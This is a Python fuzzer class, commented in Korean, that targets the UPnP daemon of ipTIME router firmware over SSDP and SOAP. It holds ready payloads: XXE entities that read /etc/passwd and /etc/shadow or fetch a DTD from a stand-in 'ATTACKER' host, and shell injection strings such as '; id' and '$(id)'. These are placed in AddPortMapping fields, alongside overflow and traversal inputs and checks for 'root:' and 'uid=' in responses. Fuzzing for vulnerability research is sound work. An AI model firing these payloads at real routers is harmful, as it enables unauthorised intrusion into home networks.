"""
ipTIME Firmware Fuzzer - UPnP/SSDP Fuzzer
upnpd (MiniUPnPd 기반) 전용 퍼저

타겟: bin/upnpd (81,244 bytes)
위험 함수: system() x4, gets() x3, sprintf(), strcpy()
공격 벡터: SSDP Discovery, SOAP XML 요청, AddPortMapping 등
"""

import socket
import random
from typing import Optional
from .base import BaseFuzzer


class UPnPFuzzer(BaseFuzzer):
    """
    UPnP/SSDP 프로토콜 퍼저
    
    upnpd는 SSDP(UDP 1900) + HTTP 기반으로 동작하며,
    system() 4회 호출과 gets() 3회 호출로 RCE 취약점 가능성이 매우 높음.
    """
    
    SSDP_MULTICAST = '239.255.255.250'
    SSDP_PORT = 1900
    
    # UPnP 서비스 URN
    SERVICE_URNS = [
        'urn:schemas-upnp-org:service:WANIPConnection:1',
        'urn:schemas-upnp-org:service:WANPPPConnection:1',
        'urn:schemas-upnp-org:service:Layer3Forwarding:1',
        'urn:schemas-upnp-org:device:InternetGatewayDevice:1',
        'urn:schemas-upnp-org:device:WANDevice:1',
    ]
    
    # SOAP 액션
    SOAP_ACTIONS = [
        'AddPortMapping',
        'DeletePortMapping',
        'GetExternalIPAddress',
        'GetGenericPortMappingEntry',
        'GetSpecificPortMappingEntry',
        'GetStatusInfo',
        'SetConnectionType',
        'RequestConnection',
        'ForceTermination',
    ]
    
    def __init__(self, config: dict):
        super().__init__(config)
        self.name = config.get('name', 'UPnPFuzzer')
        self.http_port = config.get('upnp_http_port', 5000)
        
        # XXE 페이로드
        self.xxe_payloads = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/xxe">]>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe.dtd">%xxe;]>',
        ]
        
        # 명령어 인젝션
        self.cmd_payloads = [
            '; id',
            '| id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '"; id; echo "',
            "'; id; echo '",
        ]
    
    def send(self, data: bytes) -> Optional[bytes]:
        """SSDP 또는 HTTP 전송"""
        if data.startswith(b'M-SEARCH') or data.startswith(b'NOTIFY'):
            return self._send_ssdp(data)
        else:
            return self._send_http(data)
    
    def _send_ssdp(self, data: bytes) -> Optional[bytes]:
        """SSDP UDP 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.timeout)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        
        try:
            # 유니캐스트로 타겟에 직접 전송
            sock.sendto(data, (self.target_host, self.SSDP_PORT))
            response, addr = sock.recvfrom(4096)
            return response
        except socket.timeout:
            return None
        except Exception as e:
            raise e
        finally:
            sock.close()
    
    def _send_http(self, data: bytes) -> Optional[bytes]:
        """UPnP HTTP/SOAP 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            sock.connect((self.target_host, self.http_port))
            sock.sendall(data)
            response = sock.recv(8192)
            return response if response else None
        except socket.timeout:
            return None
        except Exception as e:
            raise e
        finally:
            sock.close()
    
    def generate_seed(self) -> bytes:
        """시드 생성"""
        seeds = [
            self._make_msearch(),
            self._make_soap_request('GetExternalIPAddress', {}),
        ]
        return random.choice(seeds)
    
    def _make_msearch(self) -> bytes:
        """M-SEARCH 요청 생성"""
        request = 'M-SEARCH * HTTP/1.1\r\n'
        request += f'HOST: {self.SSDP_MULTICAST}:{self.SSDP_PORT}\r\n'
        request += 'MAN: "ssdp:discover"\r\n'
        request += 'MX: 3\r\n'
        request += 'ST: upnp:rootdevice\r\n'
        request += '\r\n'
        return request.encode()
    
    def _make_soap_request(self, action: str, args: dict,
                           service: str = None) -> bytes:
        """SOAP 요청 생성"""
        if service is None:
            service = 'urn:schemas-upnp-org:service:WANIPConnection:1'
        
        # XML 인자 생성
        args_xml = ''
        for name, value in args.items():
            args_xml += f'      <{name}>{value}</{name}>\n'
        
        body = f'''<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:{action} xmlns:u="{service}">
{args_xml}    </u:{action}>
  </s:Body>
</s:Envelope>'''
        
        request = f'POST /ctl/IPConn HTTP/1.1\r\n'
        request += f'Host: {self.target_host}:{self.http_port}\r\n'
        request += 'Content-Type: text/xml; charset="utf-8"\r\n'
        request += f'SOAPAction: "{service}#{action}"\r\n'
        request += f'Content-Length: {len(body)}\r\n'
        request += 'Connection: close\r\n'
        request += '\r\n'
        request += body
        
        return request.encode()
    
    def mutate(self, data: bytes) -> bytes:
        """UPnP 뮤테이션"""
        strategies = [
            self._mutate_msearch_st,
            self._mutate_msearch_headers,
            self._mutate_soap_action,
            self._mutate_soap_args_overflow,
            self._mutate_soap_args_injection,
            self._mutate_xxe,
            self._mutate_add_port_mapping,
            self._mutate_valid_soap_call,  # 추가된 전략
        ]
        return random.choice(strategies)(data)
    
    # ========== 뮤테이션 전략들 ==========
    
    def _mutate_valid_soap_call(self, data: bytes) -> bytes:
        """유효한 서비스/액션 파라미터 오염"""
        # 실제 ipTIME에서 사용하는 유효한 조합
        valid_calls = [
            ('urn:schemas-upnp-org:service:WANIPConnection:1', 'AddPortMapping', {
                'NewRemoteHost': '', 'NewExternalPort': '1234', 'NewProtocol': 'TCP',
                'NewInternalPort': '1234', 'NewInternalClient': '192.168.0.10',
                'NewEnabled': '1', 'NewPortMappingDescription': 'Test', 'NewLeaseDuration': '0'
            }),
            ('urn:schemas-upnp-org:service:WANIPConnection:1', 'GetExternalIPAddress', {}),
            ('urn:schemas-upnp-org:service:WANIPConnection:1', 'ForceTermination', {}),
        ]
        
        service, action, args = random.choice(valid_calls)
        
        # 인자 하나만 골라서 집중 공격
        if args:
            target_arg = random.choice(list(args.keys()))
            args[target_arg] = random.choice(self.cmd_payloads + self.xxe_payloads)
            
        return self._make_soap_request(action, args, service)

    
    def _mutate_msearch_st(self, data: bytes) -> bytes:
        """M-SEARCH ST 헤더 퍼징"""
        st_values = [
            'ssdp:all',
            'upnp:rootdevice',
            random.choice(self.SERVICE_URNS),
            'A' * random.choice([256, 512, 1024, 2048]),
            '../../../etc/passwd',
            '; id',
            '`id`',
        ]
        
        request = 'M-SEARCH * HTTP/1.1\r\n'
        request += f'HOST: {self.SSDP_MULTICAST}:{self.SSDP_PORT}\r\n'
        request += 'MAN: "ssdp:discover"\r\n'
        request += f'MX: {random.randint(-1, 999999)}\r\n'
        request += f'ST: {random.choice(st_values)}\r\n'
        request += '\r\n'
        return request.encode()
    
    def _mutate_msearch_headers(self, data: bytes) -> bytes:
        """M-SEARCH 헤더 퍼징"""
        # 비정상 헤더
        request = 'M-SEARCH * HTTP/1.1\r\n'
        request += f'HOST: {"A" * 500}\r\n'
        request += 'MAN: "ssdp:discover"\r\n'
        request += f'MX: {random.choice(["-1", "99999999", "AAAA"])}\r\n'
        request += 'ST: ssdp:all\r\n'
        request += f'X-FUZZ: {"B" * 1024}\r\n'
        request += '\r\n'
        return request.encode()
    
    def _mutate_soap_action(self, data: bytes) -> bytes:
        """SOAP 액션 퍼징"""
        # 비정상 액션 이름
        actions = self.SOAP_ACTIONS + [
            'A' * 256,
            '../../../etc/passwd',
            '; id',
            '<script>alert(1)</script>',
        ]
        
        return self._make_soap_request(
            random.choice(actions),
            {},
            random.choice(self.SERVICE_URNS)
        )
    
    def _mutate_soap_args_overflow(self, data: bytes) -> bytes:
        """SOAP 인자 오버플로우"""
        args = {
            'NewRemoteHost': 'A' * random.choice([256, 1024, 4096]),
            'NewExternalPort': str(random.randint(0, 70000)),
            'NewProtocol': random.choice(['TCP', 'UDP', 'A' * 100]),
            'NewInternalPort': str(random.randint(0, 70000)),
            'NewInternalClient': 'B' * random.choice([256, 1024]),
            'NewEnabled': random.choice(['1', '0', 'AAAA']),
            'NewPortMappingDescription': 'C' * random.choice([1000, 5000, 10000]),
            'NewLeaseDuration': str(random.choice([0, -1, 2**31-1, 2**32-1])),
        }
        
        return self._make_soap_request('AddPortMapping', args)
    
    def _mutate_soap_args_injection(self, data: bytes) -> bytes:
        """SOAP 인자 명령어 인젝션"""
        cmd = random.choice(self.cmd_payloads)
        
        args = {
            'NewRemoteHost': '',
            'NewExternalPort': '8888',
            'NewProtocol': 'TCP',
            'NewInternalPort': '80',
            'NewInternalClient': cmd,  # 명령어 인젝션 시도
            'NewEnabled': '1',
            'NewPortMappingDescription': cmd,
            'NewLeaseDuration': '0',
        }
        
        return self._make_soap_request('AddPortMapping', args)
    
    def _mutate_xxe(self, data: bytes) -> bytes:
        """XXE (XML External Entity) 공격"""
        xxe = random.choice(self.xxe_payloads)
        
        body = f'''{xxe}
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <data>&xxe;</data>
    </u:GetExternalIPAddress>
  </s:Body>
</s:Envelope>'''
        
        request = f'POST /ctl/IPConn HTTP/1.1\r\n'
        request += f'Host: {self.target_host}:{self.http_port}\r\n'
        request += 'Content-Type: text/xml; charset="utf-8"\r\n'
        request += 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"\r\n'
        request += f'Content-Length: {len(body)}\r\n'
        request += 'Connection: close\r\n'
        request += '\r\n'
        request += body
        
        return request.encode()
    
    def _mutate_add_port_mapping(self, data: bytes) -> bytes:
        """AddPortMapping 특화 퍼징"""
        # 다양한 위험 값 조합
        args = {
            'NewRemoteHost': random.choice(['', '0.0.0.0', '127.0.0.1', '; id']),
            'NewExternalPort': str(random.choice([0, 1, 22, 80, 443, 65535, 65536, -1])),
            'NewProtocol': random.choice(['TCP', 'UDP', 'SCTP', '']),
            'NewInternalPort': str(random.choice([0, 1, 22, 80, 443, 65535])),
            'NewInternalClient': random.choice([
                '127.0.0.1',
                '0.0.0.0',
                '255.255.255.255',
                '192.168.0.1; id',
                '`id`',
            ]),
            'NewEnabled': random.choice(['1', '0', '2', '-1', 'true', 'false']),
            'NewPortMappingDescription': random.choice([
                'test',
                'A' * 256,
                '; id',
                '<script>',
            ]),
            'NewLeaseDuration': str(random.choice([0, 1, 3600, 86400, 2**31])),
        }
        
        return self._make_soap_request('AddPortMapping', args)
    
    def is_crash(self, response: Optional[bytes], error: Optional[str]) -> bool:
        """크래시 감지"""
        if error:
            crash_indicators = [
                'Connection refused',
                'Connection reset',
                'No route to host',
            ]
            return any(ind in error for ind in crash_indicators)
        return False
    
    def is_interesting(self, response: Optional[bytes]) -> bool:
        """흥미로운 응답 감지"""
        if response is None:
            return False
        
        interesting_patterns = [
            b'500',
            b'error',
            b'fault',
            b'exception',
            b'root:',
            b'/etc/',
            b'uid=',
            b'<faultstring>',
        ]
        
        return any(p in response.lower() for p in interesting_patterns)
